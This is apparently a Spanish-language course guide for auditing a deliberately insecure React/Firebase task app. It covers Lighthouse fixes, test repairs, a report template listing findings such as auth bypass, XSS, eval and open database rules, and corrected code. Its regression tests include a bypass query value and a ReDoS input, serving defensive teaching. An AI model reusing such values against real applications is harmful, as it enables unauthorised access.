| Performance | *Avoid enormous network payloads* | Todo Firebase entra en un solo bundle; no hay `React.lazy` en `AppRouter` |
| Performance | *Reduce JavaScript execution time* | Contexto recreado en cada render (`AuthContext.jsx:38`), sin `useMemo` |
| Best Practices | *Avoid `document.write` / issues in console* | `console.log` de credenciales en `authService.js:15,41` |
| Best Practices | *Uses deprecated APIs / XSS* | `dangerouslySetInnerHTML`, `eval()` |
| Accessibility | *Form elements do not have associated labels* | Revisar `AuthFormFields.jsx` y `TaskForm.jsx` |
| Accessibility | *Background and foreground colors...* | Paleta de `index.css` con texto `.muted` de bajo contraste |
| SEO | *Document does not have a meta description* | `index.html` **sí** la tiene: esta debería pasar |
| SEO | *robots.txt is not valid* | No existe `public/robots.txt` |
| PWA / General | *No `<html lang>`* | `index.html` **sí** declara `lang="es"`: pasa |

### 5.7 Mejoras de rendimiento a aplicar entre la medición "antes" y la "después"

**1. Carga diferida de rutas** (reduce el bundle inicial):

```jsx
import { lazy, Suspense } from 'react';
const DashboardPage = lazy(() =>
  import('../pages/DashboardPage').then((m) => ({ default: m.DashboardPage }))
);

// Envolver <Routes> con:
<Suspense fallback={<LoadingSpinner label="Cargando..." />}>
  <Routes>{/* ... */}</Routes>
</Suspense>
```

**2. Memoizar el valor del contexto** (evita re-render de todos los consumidores):

```jsx
import { useMemo } from 'react';
const value = useMemo(() => ({ user, initializing, login, logout /* ... */ }),
  [user, initializing]);
```

**3. Eliminar Analytics del arranque** (menos JS y sin cookies sin consentimiento):

```js
// Cargar solo bajo demanda y verificando soporte:
const analytics = null; // o import('firebase/analytics') tras el consentimiento del usuario
```

**4. Usar el `id` como `key`** en `TaskList.jsx:31` (mejora la reconciliación de React):

```jsx
{tasks.map((task) => (
  <article className="task-card" key={task.id}>
```

**5. Separar los vendors** en `vite.config.js` para mejorar el cacheo entre despliegues:

```js
build: {
  rollupOptions: {
    output: {
      manualChunks: {
        firebase: ['firebase/app', 'firebase/auth', 'firebase/database'],
        react: ['react', 'react-dom', 'react-router-dom']
      }
    }
  }
}
```

### 5.8 Medir el "después"

Tras aplicar las correcciones, repita **exactamente el mismo comando** (mismo preset, misma URL,
misma máquina, mismo navegador):

```bash
npm run build
```

```bash
npx --yes lighthouse http://localhost:4173 --output=html --output=json --output-path=./reportes/lighthouse-despues --chrome-flags="--headless" --preset=desktop
```

> **Rigor de la medición:** Lighthouse tiene varianza de ±5 puntos entre corridas. Ejecute
> **3 veces** y reporte la **mediana**, cerrando el resto de aplicaciones. Un cambio de 88 a 91
> puede ser simplemente ruido; uno de 62 a 91 no lo es.

### 5.9 Presupuestos de rendimiento (automatizar el control)

Cree **`lighthouse-budget.json`** para que el pipeline falle si el bundle crece:

```json
[
  {
    "path": "/*",
    "timings": [
      { "metric": "interactive", "budget": 3500 },
      { "metric": "largest-contentful-paint", "budget": 2500 }
    ],
    "resourceSizes": [
      { "resourceType": "script", "budget": 400 },
      { "resourceType": "total", "budget": 800 }
    ]
  }
]
```

```bash
npx --yes lighthouse http://localhost:4173 --budget-path=./lighthouse-budget.json --output=html --output-path=./reportes/lighthouse-budget.html --chrome-flags="--headless"
```

---

## 6. Fase 4 — Pruebas automatizadas

### 6.1 Estado medido de la línea base

```bash
npx vitest run
```

Resultado:

```
Test Files  2 failed | 1 passed (3)
     Tests  2 failed | 10 passed (12)
```

**Fallo 1 — `src/e2e/critical-flows.spec.js`:**

```
Error: Playwright Test did not expect test.describe() to be called here.
```

Causa: `vite.config.js` no excluye `src/e2e/`, así que **Vitest intenta ejecutar las pruebas de
Playwright**. Corrección:

```js
test: {
  environment: 'jsdom',
  globals: true,
  setupFiles: './src/tests/setup.js',
  css: true,
  exclude: ['**/node_modules/**', '**/dist/**', '**/src/e2e/**']
}
```

**Fallo 2 — `src/tests/ProtectedRoute.test.jsx`:**

```
TypeError: localStorage.getItem is not a function
  at ProtectedRoute src/routes/ProtectedRoute.jsx:22:49
```

Doble causa: (a) el `localStorage` experimental de Node 25 pisa el de jsdom; (b) la prueba no
aísla el `localStorage` entre casos. Corrección en `src/tests/setup.js`:

```js
import '@testing-library/jest-dom';
import { afterEach, beforeEach, vi } from 'vitest';

const store = new Map();
const localStorageMock = {
  getItem: (k) => (store.has(k) ? store.get(k) : null),
  setItem: (k, v) => store.set(k, String(v)),
  removeItem: (k) => store.delete(k),
  clear: () => store.clear(),
  key: (i) => Array.from(store.keys())[i] ?? null,
  get length() { return store.size; }
};

beforeEach(() => {
  vi.stubGlobal('localStorage', localStorageMock);
  vi.stubGlobal('sessionStorage', localStorageMock);
});

afterEach(() => {
  store.clear();
  vi.unstubAllGlobals();
});
```

**Por qué importa:** una suite que falla por el entorno y no por el código es **peor que no tener
suite**: el equipo se acostumbra al rojo y deja de mirar. Que una prueba pase o falle según lo
que haya quedado en `localStorage` de la corrida anterior es la definición de *prueba
inestable* (*flaky*).

### 6.2 Pruebas de seguridad como pruebas de regresión

El aporte más valioso de esta auditoría: **cada vulnerabilidad corregida se convierte en una
prueba que impide que regrese.**

**`src/tests/security.test.jsx`:**

```jsx
import { render, screen } from '@testing-library/react';
import { MemoryRouter, Route, Routes } from 'react-router-dom';
import { describe, expect, it, vi } from 'vitest';
import { ProtectedRoute } from '../routes/ProtectedRoute';
import { validateEmail, validatePassword } from '../utils/validators';

const mockUseAuth = vi.fn();
vi.mock('../hooks/useAuth', () => ({ useAuth: () => mockUseAuth() }));

function renderProtected(initialEntry = '/dashboard') {
  return render(
    <MemoryRouter initialEntries={[initialEntry]}>
      <Routes>
        <Route element={<ProtectedRoute />}>
          <Route element={<div>Dashboard</div>} path="/dashboard" />
        </Route>
        <Route element={<div>Login</div>} path="/login" />
      </Routes>
    </MemoryRouter>
  );
}

describe('S-01: bypass de autenticacion', () => {
  it('localStorage.isAuthenticated NO debe conceder acceso', () => {
    mockUseAuth.mockReturnValue({ user: null, initializing: false });
    localStorage.setItem('isAuthenticated', 'true');
    renderProtected();
    expect(screen.getByText('Login')).toBeInTheDocument();
  });

  it('el query param ?bypass NO debe conceder acceso', () => {
    mockUseAuth.mockReturnValue({ user: null, initializing: false });
    renderProtected('/dashboard?bypass=skip_auth_check_2024');
    expect(screen.getByText('Login')).toBeInTheDocument();
  });
});

describe('S-08: ReDoS en la validacion de correo', () => {
  it('valida en menos de 100 ms un input adversarial', () => {
    const inicio = performance.now();
    validateEmail('a'.repeat(40) + '!');
    expect(performance.now() - inicio).toBeLessThan(100);
  });
});

describe('S-11: politica de contrasenas', () => {
  it('rechaza contrasenas de un solo caracter', () => {
    expect(validatePassword('1')).not.toBe('');
  });

  it('acepta una contrasena fuerte', () => {
    expect(validatePassword('Str0ng!Passw0rd')).toBe('');
  });
});
```

Estas pruebas **fallan hoy** —esa es la intención—. Documentar una prueba en rojo que demuestra
la vulnerabilidad, y luego verla pasar tras la corrección, es la evidencia más fuerte que puede
incluir en el reporte.

### 6.3 E2E con Playwright

```bash
npx playwright install chromium
```

```bash
npm run test:e2e
```

Requiere que `npm run preview` esté corriendo en `http://127.0.0.1:4173` (el `baseURL` de
`playwright.config.js`). Para automatizarlo, agregue a `playwright.config.js`:

```js
webServer: {
  command: 'npm run preview',
  url: 'http://127.0.0.1:4173',
  reuseExistingServer: !process.env.CI
}
```

---

## 7. Fase 5 — Plantilla del reporte final

Cree el archivo **`REPORTE-FINAL.md`** con esta estructura. Reemplace los `_(medir)_` con sus
valores reales.

````markdown
# Reporte de Auditoría de Calidad y Seguridad

**Aplicación:** Aplicacion-IIcuatri2026 (React 19 + Vite 7 + Firebase)
**Auditor:** _(nombre)_
**Fecha:** _(fecha)_
**Commit auditado:** _(git rev-parse --short HEAD)_
**Alcance:** código fuente en `src/`, dependencias, reglas de Firebase, build de producción
**Fuera de alcance:** infraestructura de Firebase, pruebas de carga, ingeniería social

---

## 1. Resumen ejecutivo

La auditoría identificó **N hallazgos**: X críticos, Y altos, Z medios, W bajos.

Los riesgos más graves permiten a un atacante **no autenticado**: (a) acceder al panel de
administración, (b) leer y modificar la base de datos completa, y (c) obtener contraseñas de
todos los usuarios en texto plano. Se considera que la aplicación **no está en condiciones de
ser desplegada en producción** hasta corregir los hallazgos críticos.

| Severidad | Cantidad | Corregidos | Pendientes |
|-----------|----------|-----------|------------|
| Crítica   |          |           |            |
| Alta      |          |           |            |
| Media     |          |           |            |
| Baja      |          |           |            |

---

## 2. Metodología

| Fase | Herramienta | Versión | Comando |
|------|------------|---------|---------|
| Estático | ESLint + eslint-plugin-security | 9.x / 3.0.1 | `npm run lint` |
| Estático | SonarQube Community | _(versión)_ | `sonar-scanner` |
| Dependencias | npm audit | npm 10.x | `npm audit` |
| Secretos | gitleaks | _(versión)_ | `gitleaks detect` |
| Backend | Firebase Emulator | _(versión)_ | `firebase emulators:exec` |
| Rendimiento | Lighthouse | _(versión)_ | `npx lighthouse` |
| Pruebas | Vitest + Playwright | 3.2 / 1.53 | `npm test`, `npm run test:e2e` |

---

## 3. Hallazgos de calidad

| ID | Hallazgo | Archivo | Severidad | Estado |
|----|----------|---------|-----------|--------|
| Q-01 | 56 falsos positivos de `no-unused-vars` por falta de `eslint-plugin-react` | `eslint.config.js` | Media | |
| Q-02 | Vitest ejecuta las specs de Playwright y la suite falla | `vite.config.js` | Media | |
| Q-03 | `key={index}` en la lista de tareas | `src/components/TaskList.jsx:31` | Baja | |
| Q-04 | `useEffect` con arreglo de dependencias incompleto | `src/hooks/useTasks.js:47` | Media | |
| Q-05 | Contexto sin `useMemo`: re-render de todos los consumidores | `src/context/AuthContext.jsx:38` | Media | |
| Q-06 | `getTaskStats` no inicializa `in-progress` → `undefined` en la tarjeta | `src/utils/formatters.js:14` | Baja | |
| Q-07 | Node 25 rompe el `localStorage` de jsdom en las pruebas | entorno | Media | |
| Q-08 | `node_modules/` y `dist/` versionados en Git | repositorio | Media | |
| Q-09 | El README documenta reglas de Firebase distintas de las desplegadas | `README.md` | Media | |
| Q-10 | `eslint-disable` usado para silenciar una regla de seguridad | `src/utils/validators.js:78` | Alta | |

**Métricas ESLint**

| Métrica | Antes | Después |
|---------|-------|---------|
| Errores | 56 | _(medir)_ |
| Advertencias | 10 | _(medir)_ |
| Hallazgos reales (sin falsos positivos) | 10 | _(medir)_ |

**Métricas SonarQube**

| Métrica | Antes | Después |
|---------|-------|---------|
| Bugs | _(medir)_ | |
| Vulnerabilities | _(medir)_ | |
| Security Hotspots | _(medir)_ | |
| Code Smells | _(medir)_ | |
| Deuda técnica | _(medir)_ | |
| Cobertura | _(medir)_ | |
| Duplicación | _(medir)_ | |
| Quality Gate | _(medir)_ | |

---

## 4. Hallazgos de seguridad

Para cada hallazgo: descripción, ubicación, categoría OWASP, impacto, prueba de concepto y
corrección.

| ID | Hallazgo | OWASP | Severidad | Estado |
|----|----------|-------|-----------|--------|
| S-01 | Bypass de rutas protegidas vía `localStorage` y `?bypass=` | A01 | **Crítica** | |
| S-02 | Rol de admin leído de `localStorage` con *fail-open* | A01 | **Crítica** | |
| S-03 | Contraseñas en texto plano en consola, `localStorage` y base de datos | A02 | **Crítica** | |
| S-04 | Enumeración de usuarios por mensajes de error diferenciados | A07 | Media | |
| S-05 | Ruta `/debug` pública que expone todos los secretos | A05 | **Crítica** | |
| S-06 | XSS almacenado vía `dangerouslySetInnerHTML` | A03 | **Crítica** | |
| S-07 | `eval()` sobre input del usuario | A03 | **Crítica** | |
| S-08 | ReDoS en el regex de validación de correo | A03 | Media | |
| S-09 | `.env` versionado y `.gitignore` sin la regla | A05 | Alta | |
| S-10 | Listeners de Firebase sin `unsubscribe` (fuga de memoria) | — | Media | |
| S-11 | Reglas de Realtime Database totalmente abiertas | A01 | **Crítica** | |
| S-12 | IDOR: `getTasksFromAnyUser()` / `getAllUsers()` | A01 | **Crítica** | |
| S-13 | 8 secretos hardcodeados y exportados desde el frontend | A02 | **Crítica** | |
| S-14 | Política de contraseñas inexistente (1 carácter es válido) | A07 | Alta | |
| S-15 | Token de sesión guardado en `localStorage` (accesible por XSS) | A07 | Alta | |
| S-16 | Logout que no limpia credenciales del cliente | A07 | Alta | |
| S-17 | 7 dependencias vulnerables (5 altas) | A06 | Alta | |

### Detalle de dependencias (`npm audit`)

| Paquete | Severidad | Advisory | ¿Producción? | Corregido |
|---------|-----------|----------|--------------|-----------|
| react-router | alta | GHSA-qwww-vcr4-c8h2 | Sí | |
| react-router-dom | alta | (transitiva) | Sí | |
| protobufjs | moderada | GHSA-j3f2-48v5-ccww | Sí | |
| postcss | alta | Path traversal en source maps | No | |
| js-yaml | alta | GHSA-52cp-r559-cp3m | No | |
| brace-expansion | alta | GHSA-3jxr-9vmj-r5cp | No | |
| esbuild | baja | GHSA-g7r4-m6w7-qqqr | No | |

| Métrica | Antes | Después |
|---------|-------|---------|
| Total de vulnerabilidades | 7 | _(medir)_ |
| Críticas / Altas | 0 / 5 | _(medir)_ |
| Moderadas / Bajas | 1 / 1 | _(medir)_ |

---

## 5. Métricas de Lighthouse

**Condiciones de medición:** Chrome _(versión)_, modo incógnito, preset _(desktop/mobile)_,
mediana de 3 corridas, URL `http://localhost:4173`.

### Puntajes por categoría

| Categoría | Antes | Después | Δ |
|-----------|-------|---------|---|
| Performance | _(medir)_ | _(medir)_ | |
| Accessibility | _(medir)_ | _(medir)_ | |
| Best Practices | _(medir)_ | _(medir)_ | |
| SEO | _(medir)_ | _(medir)_ | |

### Métricas Core Web Vitals

| Métrica | Antes | Después | Meta | ¿Cumple? |
|---------|-------|---------|------|----------|
| FCP | _(medir)_ | _(medir)_ | < 1.8 s | |
| LCP | _(medir)_ | _(medir)_ | < 2.5 s | |
| TBT | _(medir)_ | _(medir)_ | < 200 ms | |
| CLS | _(medir)_ | _(medir)_ | < 0.1 | |
| Speed Index | _(medir)_ | _(medir)_ | < 3.4 s | |

### Tamaño del bundle

| Recurso | Antes | Después |
|---------|-------|---------|
| JS total (sin comprimir) | _(medir)_ | _(medir)_ |
| JS total (gzip) | _(medir)_ | _(medir)_ |
| CSS total | _(medir)_ | _(medir)_ |
| Número de chunks | _(medir)_ | _(medir)_ |

### Mejoras aplicadas y su efecto

| Mejora | Métrica afectada | Δ observado |
|--------|-----------------|-------------|
| `React.lazy` en las rutas | LCP, TBT | |
| `useMemo` en AuthContext | TBT | |
| Eliminar Analytics del arranque | JS total, Best Practices | |
| `manualChunks` de vendors | LCP en visitas repetidas | |
| `key={task.id}` | TBT | |
| Quitar `console.log` | Best Practices | |

---

## 6. Cobertura de pruebas

| Métrica | Antes | Después |
|---------|-------|---------|
| Archivos de prueba que pasan | 1 / 3 | _(medir)_ |
| Casos que pasan | 10 / 12 | _(medir)_ |
| Cobertura de líneas | _(medir)_ | _(medir)_ |
| Pruebas de seguridad (regresión) | 0 | _(medir)_ |
| Pruebas de reglas de Firebase | 0 | _(medir)_ |

---

## 7. Recomendaciones pendientes

Ordenadas por relación impacto/esfuerzo.

### Prioridad 1 — Antes de cualquier despliegue

1. Desplegar las Security Rules restrictivas y verificarlas con el emulador.
2. Eliminar `DebugPage.jsx` y su ruta.
3. Eliminar todos los secretos hardcodeados **y rotarlos** en sus proveedores.
4. Eliminar el almacenamiento y logging de contraseñas.
5. Reescribir `ProtectedRoute` y `AdminRoute` sin dependencia de `localStorage`.
6. Eliminar `eval()` y todos los `dangerouslySetInnerHTML`.
7. `npm audit fix` sobre las dependencias de producción.

### Prioridad 2 — Corto plazo

8. Custom Claims de Firebase para el rol de administrador (autorización del lado servidor).
9. Política de contraseñas (mínimo 12 caracteres, complejidad, lista de contraseñas comunes).
10. Mensajes de error genéricos en el login.
11. Sanitización con DOMPurify si se requiere renderizar HTML enriquecido.
12. Limpiar todas las suscripciones en el `return` de los `useEffect`.
13. Corregir la configuración de ESLint y Vitest.

### Prioridad 3 — Endurecimiento

14. Content Security Policy vía cabeceras de Firebase Hosting.
15. App Check de Firebase para evitar el abuso de la API desde clientes no autorizados.
16. Rate limiting / bloqueo por intentos fallidos de login.
17. Auditoría y monitoreo (OWASP A09): hoy no hay ningún registro de eventos de seguridad.
18. Pipeline de CI con Quality Gate: `lint` + `test` + `audit` + presupuesto de Lighthouse.
19. Verificación de correo obligatoria antes de permitir el uso de la app.
20. Dependabot o Renovate para actualizaciones automáticas de seguridad.

### Riesgo residual aceptado

_(Documente aquí lo que se decide no corregir y por qué. Un riesgo aceptado conscientemente y
por escrito es gestión; uno ignorado en silencio es negligencia.)_

---

## 8. Anexos

- `reportes/eslint-baseline.html` — reporte completo de ESLint
- `reportes/npm-audit-baseline.json` — salida de npm audit
- `reportes/lighthouse-antes.html` / `lighthouse-despues.html`
- `reportes/gitleaks.json` — secretos detectados
- Capturas de las pruebas de concepto de S-01, S-02, S-05, S-06 y S-07
````

---

## Anexo A — Correcciones propuestas

> Ninguna de estas correcciones está aplicada. Trabájelas en una rama aparte.

### A.1 `eslint.config.js` corregido

```js
import js from '@eslint/js';
import react from 'eslint-plugin-react';
import reactHooks from 'eslint-plugin-react-hooks';
import reactRefresh from 'eslint-plugin-react-refresh';
import security from 'eslint-plugin-security';
import globals from 'globals';

export default [
  { ignores: ['dist/**', 'coverage/**', 'node_modules/**'] },
  js.configs.recommended,
  {
    files: ['**/*.{js,jsx}'],
    languageOptions: {
      ecmaVersion: 2024,
      sourceType: 'module',
      globals: { ...globals.browser, ...globals.node },
      parserOptions: { ecmaFeatures: { jsx: true } }
    },
    settings: { react: { version: 'detect' } },
    plugins: { react, 'react-hooks': reactHooks, 'react-refresh': reactRefresh, security },
    rules: {
      ...react.configs.flat.recommended.rules,
      ...react.configs.flat['jsx-runtime'].rules,
      ...reactHooks.configs.recommended.rules,
      ...security.configs.recommended.rules,
      'react-refresh/only-export-components': ['warn', { allowConstantExport: true }],
      'no-console': ['warn', { allow: ['warn', 'error'] }],
      'no-eval': 'error',
      'no-implied-eval': 'error',
      'react/no-danger': 'error',
      'react/prop-types': 'off',
      'security/detect-eval-with-expression': 'error',
      'security/detect-unsafe-regex': 'error'
    }
  }
];
```

### A.2 `src/firebase/config.js` sin secretos

```js
import { initializeApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getDatabase } from 'firebase/database';

// La configuracion del cliente Firebase NO es secreta, pero se externaliza
// para poder usar proyectos distintos en desarrollo y produccion.
const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  databaseURL: import.meta.env.VITE_FIREBASE_DATABASE_URL,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID
};

// Sin ADMIN_PASSWORD, JWT_SECRET, STRIPE_SECRET_KEY, SENDGRID_API_KEY ni
// DATABASE_ADMIN_TOKEN: esos valores viven exclusivamente en el backend.
// Todo lo que se importe aqui termina en el bundle que descarga el navegador.

const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const database = getDatabase(app);
export { app };
```

Con un `.env.example` versionado (**sin valores reales**) y un `.env` ignorado por Git:

```dotenv
VITE_FIREBASE_API_KEY=
VITE_FIREBASE_AUTH_DOMAIN=
VITE_FIREBASE_DATABASE_URL=
VITE_FIREBASE_PROJECT_ID=
VITE_FIREBASE_STORAGE_BUCKET=
VITE_FIREBASE_MESSAGING_SENDER_ID=
VITE_FIREBASE_APP_ID=
```

> Recuerde: `VITE_*` **se inyecta en el bundle**. Nunca ponga ahí un secreto real. Las variables
> de entorno de Vite sirven para *configuración por ambiente*, no para *secretos*.

### A.3 `src/routes/ProtectedRoute.jsx` corregido

```jsx
import { Navigate, Outlet, useLocation } from 'react-router-dom';
import { LoadingSpinner } from '../components/LoadingSpinner';
import { useAuth } from '../hooks/useAuth';

export function ProtectedRoute() {
  const { user, initializing } = useAuth();
  const location = useLocation();

  if (initializing) {
    return (
      <div className="centered">
        <LoadingSpinner label="Validando sesion..." />
      </div>
    );
  }

  // Unica fuente de verdad: el estado de sesion de Firebase.
  // Sin localStorage y sin tokens de bypass: el cliente controla ambos.
  if (!user) {
    return <Navigate replace state={{ from: location }} to="/login" />;
  }

  return <Outlet />;
}
```

### A.4 `src/routes/AdminRoute.jsx` corregido (Custom Claims)

```jsx
import { useEffect, useState } from 'react';
import { Navigate, Outlet } from 'react-router-dom';
import { LoadingSpinner } from '../components/LoadingSpinner';
import { useAuth } from '../hooks/useAuth';

export function AdminRoute() {
  const { user, initializing } = useAuth();
  const [isAdmin, setIsAdmin] = useState(null);

  useEffect(() => {
    let cancelado = false;

    if (!user) {
      setIsAdmin(false);
      return () => { cancelado = true; };
    }

    // El claim lo firma Firebase y solo lo asigna el Admin SDK desde el backend:
    // el cliente no puede falsificarlo.
    user.getIdTokenResult(true).then((token) => {
      if (!cancelado) setIsAdmin(token.claims.admin === true);
    });

    return () => { cancelado = true; };
  }, [user]);

  if (initializing || isAdmin === null) {
    return <div className="centered"><LoadingSpinner label="Verificando permisos..." /></div>;
  }

  // Fail-closed: ante la duda, se deniega.
  if (!user || !isAdmin) {
    return <Navigate replace to="/dashboard" />;
  }

  return <Outlet />;
}
```

Asignación del claim desde el backend (script de un solo uso con el Admin SDK, **fuera** del
repositorio del frontend):

```js
// scripts/set-admin.js — ejecutar en un entorno seguro, nunca en el cliente
import admin from 'firebase-admin';
admin.initializeApp({ credential: admin.credential.applicationDefault() });
await admin.auth().setCustomUserClaims('UID_DEL_USUARIO', { admin: true });
```

### A.5 `src/services/authService.js` corregido

```js
import {
  createUserWithEmailAndPassword,
  sendEmailVerification,
  sendPasswordResetEmail,
  signInWithEmailAndPassword,
  signOut,
  updateProfile
} from 'firebase/auth';
import { ref, set } from 'firebase/database';
import { auth, database } from '../firebase/config';

const ERROR_GENERICO = 'Correo o contrasena incorrectos.';

export async function registerUser({ displayName, email, password }) {
  // Sin console.log de credenciales.
  const credential = await createUserWithEmailAndPassword(auth, email, password);
  await updateProfile(credential.user, { displayName });
  await sendEmailVerification(credential.user);

  // Solo datos no sensibles. La contrasena la gestiona Firebase Auth (bcrypt/scrypt).
  // El campo 'role' no se escribe desde el cliente: lo asigna el backend con Custom Claims.
  await set(ref(database, `users/${credential.user.uid}`), {
    email,
    displayName,
    createdAt: Date.now()
  });

  return credential.user;
}

export async function loginUser({ email, password }) {
  try {
    const credential = await signInWithEmailAndPassword(auth, email, password);
    // Sin localStorage: el SDK de Firebase ya persiste la sesion de forma segura
    // y renueva el token automaticamente.
    return credential.user;
  } catch {
    // Mensaje identico para "usuario no existe" y "contrasena incorrecta":
    // impide la enumeracion de cuentas validas.
    throw new Error(ERROR_GENERICO);
  }
}

export async function resetPassword(email) {
  await sendPasswordResetEmail(auth, email);
}

export async function logoutUser() {
  await signOut(auth);
  // Limpieza defensiva de cualquier residuo de versiones anteriores.
  ['user_email', 'user_password', 'user_uid', 'user_role', 'auth_token', 'isAuthenticated']
    .forEach((k) => localStorage.removeItem(k));
}
```

### A.6 `src/utils/validators.js` corregido

```js
// Regex lineal, sin cuantificadores anidados: no hay backtracking catastrofico.
const emailPattern = /^[^\s@]{1,64}@[^\s@]{1,255}\.[a-zA-Z]{2,24}$/;

const LONGITUD_MINIMA = 12;

export function validateEmail(email) {
  const valor = (email ?? '').trim();
  if (!valor) return 'El correo es obligatorio.';
  if (valor.length > 254) return 'El correo es demasiado largo.';
  if (!emailPattern.test(valor)) return 'Ingresa un correo valido.';
  return '';
}

export function validatePassword(password) {
  if (!password) return 'La contrasena es obligatoria.';
  if (password.length < LONGITUD_MINIMA) {
    return `La contrasena debe tener al menos ${LONGITUD_MINIMA} caracteres.`;
  }
  if (!/[a-z]/.test(password)) return 'Debe incluir al menos una minuscula.';
  if (!/[A-Z]/.test(password)) return 'Debe incluir al menos una mayuscula.';
  if (!/[0-9]/.test(password)) return 'Debe incluir al menos un numero.';
  if (!/[^A-Za-z0-9]/.test(password)) return 'Debe incluir al menos un simbolo.';
  return '';
}

export function validateTask(values) {
  const errors = {};
  const title = (values.title ?? '').trim();
  const description = (values.description ?? '').trim();

  if (!title) errors.title = 'El titulo es obligatorio.';
  else if (title.length > 120) errors.title = 'Maximo 120 caracteres.';

  if (description.length > 2000) errors.description = 'Maximo 2000 caracteres.';

  if (!['pending', 'in-progress', 'completed'].includes(values.status ?? 'pending')) {
    errors.status = 'Estado invalido.';
  }

  return errors;
}

// evaluateFormula() se elimina por completo.
// Si en el futuro se necesita evaluar expresiones aritmeticas, use un parser
// acotado (por ejemplo expr-eval), nunca eval() ni new Function().
```

### A.7 Renderizado seguro en `TaskList.jsx`

**Opción preferida** — dejar que React escape el contenido (sin dependencias nuevas):

```jsx
{tasks.map((task) => (
  <article className="task-card" key={task.id}>
    <h3>{task.title}</h3>
    <p>{task.description}</p>
  </article>
))}
```

**Si el requisito exige HTML enriquecido**, sanitizar con DOMPurify:

```bash
npm install dompurify
```

```jsx
import DOMPurify from 'dompurify';

const limpio = (html) =>
  DOMPurify.sanitize(html ?? '', {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: []
  });

<h3>{task.title}</h3>
<p dangerouslySetInnerHTML={{ __html: limpio(task.description) }} />
```

Note que el **título nunca** se renderiza como HTML y la lista de etiquetas permitidas es
explícita: sin `<img>`, sin `<script>`, sin atributos (`onerror`, `onload`, `href`...).

### A.8 Limpieza de suscripciones en `AuthContext.jsx`

```jsx
useEffect(() => {
  const unsubscribe = onAuthStateChanged(auth, (nextUser) => {
    setUser(nextUser);
    setInitializing(false);
  });

  return unsubscribe; // Evita la fuga de memoria y el consumo de cuota.
}, []);

const value = useMemo(
  () => ({ user, initializing, register, login, logout, recoverPassword }),
  [user, initializing]
);
```

Sin `userPassword` en el estado, sin `adminBypass` en el contexto.

### A.9 `src/services/taskService.js` — eliminar el IDOR

```js
import { onValue, push, ref, remove, set, update } from 'firebase/database';
import { auth, database } from '../firebase/config';

function refDeTareasDelUsuario() {
  const uid = auth.currentUser?.uid;
  if (!uid) throw new Error('No hay sesion activa.');
  // El uid nunca viene por parametro: siempre sale de la sesion de Firebase.
  return ref(database, `tasks/${uid}`);
}

export function subscribeToTasks(onData, onError) {
  return onValue(
    refDeTareasDelUsuario(),
    (snapshot) => {
      const value = snapshot.val() ?? {};
      onData(
        Object.entries(value)
          .map(([id, task]) => ({ id, ...task }))
          .sort((a, b) => (b.updatedAt ?? 0) - (a.updatedAt ?? 0))
      );
    },
    onError
  );
}

export async function createTask(payload) {
  const now = Date.now();
  await set(push(refDeTareasDelUsuario()), {
    title: payload.title,
    description: payload.description ?? '',
    status: payload.status ?? 'pending',
    createdAt: now,
    updatedAt: now
  });
}

export async function updateTask(taskId, payload) {
  const uid = auth.currentUser?.uid;
  if (!uid) throw new Error('No hay sesion activa.');
  await update(ref(database, `tasks/${uid}/${taskId}`), {
    ...payload,
    updatedAt: Date.now()
  });
}

export async function deleteTask(taskId) {
  const uid = auth.currentUser?.uid;
  if (!uid) throw new Error('No hay sesion activa.');
  await remove(ref(database, `tasks/${uid}/${taskId}`));
}

// getTasksFromAnyUser() y getAllUsers() se eliminan.
// Aunque el cliente no las llame, existir en el bundle es documentar el ataque.
// La defensa real son las Security Rules (seccion 4.3).
```

### A.10 Pipeline de CI

**`.github/workflows/calidad-seguridad.yml`:**

```yaml
name: Calidad y Seguridad

on:
  push: { branches: [main] }
  pull_request: { branches: [main] }

jobs:
  auditoria:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: npm

      - run: npm ci

      - name: Lint (incluye reglas de seguridad)
        run: npm run lint

      - name: Pruebas unitarias
        run: npx vitest run

      - name: Auditoria de dependencias de produccion
        run: npm audit --omit=dev --audit-level=high

      - name: Deteccion de secretos
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Build
        run: npm run build

      - name: Lighthouse CI
        run: |
          npm install -g @lhci/cli
          lhci autorun --collect.staticDistDir=./dist --assert.preset=lighthouse:recommended
```

**Por qué importa:** una auditoría manual describe el estado de **un día**. Un pipeline lo
convierte en una **garantía permanente**: la próxima vez que alguien reintroduzca `eval()`, abra
las reglas de Firebase o suba una dependencia vulnerable, el merge se bloquea solo.

---

## Anexo B — Checklist de entrega

### Ejecución

- [ ] `npm install` sin errores
- [ ] `npm run lint` ejecutado y `reportes/eslint-baseline.json` guardado
- [ ] `npm audit --json` guardado
- [ ] SonarQube (o alternativa) ejecutado, capturas del dashboard
- [ ] Búsqueda de secretos ejecutada, resultados guardados
- [ ] `database.rules.json` revisado y probado contra el emulador
- [ ] Pruebas de concepto de S-01, S-02, S-05, S-06 y S-07 documentadas con captura
- [ ] Lighthouse "antes" ejecutado (mediana de 3 corridas) y HTML guardado
- [ ] Mejoras aplicadas en una rama aparte
- [ ] Lighthouse "después" ejecutado en las mismas condiciones
- [ ] Suite de pruebas de regresión de seguridad creada y en verde

### Documento

- [ ] `REPORTE-FINAL.md` con todas las tablas completadas
- [ ] Cada hallazgo con ID, ubicación exacta (`archivo:línea`), OWASP, severidad y corrección
- [ ] Tabla de Lighthouse antes/después con los deltas calculados
- [ ] Recomendaciones pendientes priorizadas
- [ ] Riesgo residual aceptado, documentado por escrito
- [ ] Anexos con los reportes HTML/JSON de respaldo

### Criterios de calidad del reporte

- [ ] Cada afirmación está respaldada por evidencia reproducible (comando + salida)
- [ ] Se distingue entre vulnerabilidades de producción y de tooling
- [ ] Se distingue entre falsos positivos y hallazgos reales
- [ ] Se explica **por qué** cada hallazgo importa, no solo **qué** es
